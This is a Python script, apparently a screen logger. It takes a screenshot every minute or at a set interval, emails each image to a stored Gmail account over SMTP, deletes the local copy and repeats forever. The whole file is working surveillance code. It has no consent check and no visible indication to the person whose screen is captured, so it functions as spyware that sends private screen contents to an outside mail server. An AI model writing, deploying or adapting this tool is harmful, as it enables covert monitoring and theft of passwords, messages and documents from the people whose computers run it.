import pyautogui
import subprocess
import smtplib #SMTP services
import os
import time
import tempfile
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import argparse

'''
Parser of command line arguments
'''
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    
    #Initialization of needed arguments
    parser.add_argument("-refresh", "-t", dest="refresh_time", help="Refreshing time of log info")
    
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line

    return args.refresh_time


def send_mail(email, password, img_name):
    msg = MIMEMultipart()
    msg['Subject'] = 'Screenshot'
    msg['From'] = email
    msg['To'] = email

    #Creation time in text of mail
    text = MIMEText(time.ctime(os.path.getctime(img_name)))
    msg.attach(text)
    
    #Screenshot reading and attachment in mail
    with open(img_name, 'rb') as f:
        image = MIMEImage(f.read(), name=os.path.basename(img_name))
        msg.attach(image)

    #Sending mail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg.as_string())
    server.quit()

def credentials():
    with open('credentials.txt', "r") as f:
        credentials = ((f.read()).split('\n'))[0].split(' ')

    mail = credentials[0]
    password = credentials[1]

    return mail, password

def screenshot():
    myScreenshot = pyautogui.screenshot()
    
    #Name of the screenshot (screenshot+current_time.png)
    img_name = 'screenshot'+str(time.localtime())+'.png'
    myScreenshot.save(img_name)
    return img_name

def main():
    refresh_time = args_parser()
    
    #A screenshot every 1min=60s
    if not refresh_time:
        refresh_time = '60'

    mail, password = credentials()
    os.chdir(tempfile.gettempdir())

    while(True):
        img_name = screenshot()
        send_mail(mail, password, img_name)
        os.remove(img_name)
        time.sleep(int(refresh_time))

if __name__=='__main__':
    main()